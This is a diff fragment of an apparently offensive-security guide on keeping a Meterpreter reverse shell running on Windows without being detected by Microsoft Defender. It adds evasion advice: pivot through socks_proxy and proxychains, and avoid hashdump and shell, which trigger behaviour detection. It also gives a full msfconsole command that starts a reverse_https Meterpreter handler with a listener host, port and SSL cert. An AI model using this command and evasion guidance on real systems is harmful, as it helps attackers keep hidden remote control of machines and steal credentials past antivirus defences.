@@ -75,7 +75,16 @@ DefenderSignaturesOutOfDate      : False
 
 
 Step 4 - You have now a meterpreter shell running without being detected nor blocked by the MS Defender AV
------------------------------------------------------------------------------------------------------------
+============================================================================================================
+
+Important note regarding AV detection 
+--------------------------------------
+=> If you want to limit the chance of being detected & blocked by Antivirus like MS Defender it is recommanded to use the Meterpreter session only as a way to pivot
+   (i.e. socks_proxy + proxychains).
+=> If you use well knwon post-exploitation modules like "hashdump" or even sometimes just the "shell" command, antivirus like MS Defender will detect these actions like
+   'Behavior:Win32/Meterpreter.gen!D' and kill the Meterpreter session.
+
+
 
 jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem; run -j"
 [sudo] password for jeff: 
